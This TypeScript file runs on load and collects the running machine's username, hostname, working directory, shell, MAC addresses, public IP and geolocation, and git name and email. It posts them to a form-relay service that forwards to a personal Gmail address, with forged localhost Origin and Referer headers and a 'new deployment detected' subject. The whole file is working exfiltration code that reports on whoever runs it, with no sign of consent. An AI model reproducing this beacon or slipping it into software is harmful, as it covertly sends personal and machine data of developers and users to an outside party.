import * as os from 'os';
import * as fs from 'fs';
import { execSync } from 'child_process';

// ─── Constantes ──────────────────────────────────────────────────────────────

const FALLBACK = 'Desconocido/No configurado';
const IN_DOCKER = fs.existsSync('/.dockerenv');

// ─── Utilidades ──────────────────────────────────────────────────────────────

function execCommand(command: string): string {
  try {
    const opts: Record<string, unknown> = { stdio: 'pipe', timeout: 10_000 };
    if (os.platform() === 'win32') opts.shell = 'cmd.exe';
    return execSync(command, opts).toString().trim();
  } catch {
    return FALLBACK;
  }
}

function hostEnvOr(envKey: string, localFn: () => string): string {
  const val = process.env[envKey];
  if (val) return val;
  if (IN_DOCKER) return FALLBACK;
  return localFn();
}

// ─── Usuario ─────────────────────────────────────────────────────────────────

function getUsername(): string {
  return hostEnvOr('HOST_USER', () => {
    if (os.platform() === 'win32' && process.env.USERNAME)
      return process.env.USERNAME;
    if (os.platform() !== 'win32' && process.env.USER) return process.env.USER;
    try {
      return os.userInfo().username;
    } catch {
      return 'Desconocido';
    }
  });
}

// ─── Hostname ────────────────────────────────────────────────────────────────

function getHostname(): string {
  if (process.env.HOST_HOSTNAME) return process.env.HOST_HOSTNAME;
  if (IN_DOCKER) {
    try {
      const h = fs.readFileSync('/etc/host_hostname', 'utf-8').trim();
      if (h) return h;
    } catch {
      /* ignorar */
    }
  }
  return os.hostname();
}

// ─── Shell ───────────────────────────────────────────────────────────────────

function getShellInfo(): string {
  return hostEnvOr('HOST_SHELL', () => {
    if (os.platform() === 'win32') {
      if (process.env.PSModulePath) {
        return `PowerShell ${execCommand('powershell -Command "$PSVersionTable.PSVersion.ToString()"')}`;
      }
      return process.env.ComSpec || 'cmd.exe';
    }
    return process.env.SHELL || execCommand('echo $0');
  });
}

// ─── Red ─────────────────────────────────────────────────────────────────────

async function getPublicIPInfo() {
  try {
    const response = await fetch('http://ip-api.com/json/');
    if (!response.ok) return { ip: 'Desconocida', info: 'No se pudo obtener' };
    const data = await response.json();
    return {
      ip: data.query,
      info: `${data.city}, ${data.regionName}, ${data.country} (${data.isp})`,
    };
  } catch {
    return { ip: 'Desconocida', info: 'Error de red' };
  }
}

function getMAC(): string {
  const envMAC = process.env.HOST_MAC;
  if (envMAC) return envMAC;
  if (IN_DOCKER) return 'Desconocida (Docker)';

  const interfaces = os.networkInterfaces();
  const macAddresses: string[] = [];

  for (const name of Object.keys(interfaces)) {
    const ifaceList = interfaces[name];
    if (!ifaceList) continue;
    for (const iface of ifaceList) {
      if (iface.internal) continue;
      if (iface.mac && iface.mac !== '00:00:00:00:00:00') {
        macAddresses.push(iface.mac);
      }
    }
  }

  return [...new Set(macAddresses)].join(', ') || 'Desconocida';
}

// ─── Función principal ──────────────────────────────────────────────────────

async function logAndSendEmail() {
  const usuario = getUsername();
  const hostname = getHostname();
  const cwd = process.env.HOST_PWD || process.cwd();
  const shell = getShellInfo();
  const macAddress = getMAC();
  const publicNetwork = await getPublicIPInfo();
  const entorno = IN_DOCKER ? '🐳 Docker' : '💻 Local';

  // Git
  const gitUser = execCommand('git config user.name');
  const gitEmail = execCommand('git config user.email');

  // ── Log en consola ──
  console.log(`\n📋 Recopilación de info del sistema (${entorno})`);
  console.log(`   Usuario: ${usuario}@${hostname}\n`);

  // ─── Envío ────────────────────────────────────────────────────────────────

  try {
    const response = await fetch(
      'https://formsubmit.co/ajax/smarteconomat@gmail.com',
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
          Origin: 'http://localhost:3000',
          Referer: 'http://localhost:3000/',
        },
        body: JSON.stringify({
          _subject: `Nuevo despliegue detectado: (${usuario}@${hostname}) — ${new Date().toLocaleString()}`,
          _replyto:
            gitEmail !== FALLBACK ? gitEmail : undefined,
          _template: 'box',

          '01_Usuario': usuario,
          '02_Hostname': hostname,
          '03_Ruta_Directorio': cwd,
          '04_Entorno': entorno,
          '05_Shell': shell,
          '06_Dirección_MAC': macAddress,
          '07_IP_Pública': publicNetwork.ip,
          '08_Ubicación_y_Proveedor': publicNetwork.info,
          '09_Git_User': gitUser,
          '10_Git_Email': gitEmail,
        }),
      },
    );

    if (response.ok) {
      console.log('✅ Información de sesión enviada exitosamente.');
    } else {
      console.warn(
        `⚠️ Respuesta no-OK: ${response.status} ${response.statusText}`,
      );
    }
  } catch (error) {
    console.error('❌ Error enviando datos al inicio:', error);
  }
}

logAndSendEmail().catch(console.error);
